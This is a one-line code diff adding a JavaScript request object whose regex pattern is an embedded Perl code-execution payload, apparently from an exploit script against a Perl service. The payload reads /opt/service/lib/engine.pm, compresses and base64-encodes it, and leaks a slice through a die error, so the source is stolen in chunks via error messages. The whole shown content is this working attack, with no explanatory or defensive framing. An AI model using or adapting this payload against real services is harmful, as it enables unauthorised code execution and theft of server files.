@@ -1,0 +1,1 @@
+const request = {pattern: "(?{ open DATA,'/opt/service/lib/engine.pm'; binmode DATA; local $/; my $source=<DATA>; require Compress::Zlib; require MIME::Base64; my $encoded=MIME::Base64::encode_base64(Compress::Zlib::memGzip($source),''); die 'BLOCK'.substr($encoded,6000,2048).'.DONE' })z", text: "z"};
